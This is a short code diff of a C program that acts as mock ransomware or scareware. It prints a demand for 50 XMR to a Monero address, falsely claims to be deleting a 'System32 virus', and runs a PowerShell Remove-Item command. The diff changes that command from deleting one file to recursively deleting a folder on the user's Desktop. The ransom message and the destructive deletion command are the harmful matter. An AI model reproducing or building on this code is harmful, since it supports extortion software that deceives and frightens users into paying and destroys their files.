@@ -10,6 +10,8 @@ int main()
   system("echo Pay 50 XMR to this address 43AuH6e7jF5dzmrqCzWhDMinb6NYRhZJA3PLhK41aRwxAtKL9fgFrHF7PeZxEuFmwJdC3m4HxABkDTG7Hm1D3ZLK3RB1CG9 and your computer will be safe!");
   system("timeout 15");
   system("echo Deleting System32 virus...");
-  system("powershell Remove-Item %userprofile%\test.txt");
-  system("timeout 20");
+  system("cd %userprofile%");
+  system("cd Desktop");
+  system("powershell Remove-Item -r test");
+  system("timeout 30");
 }
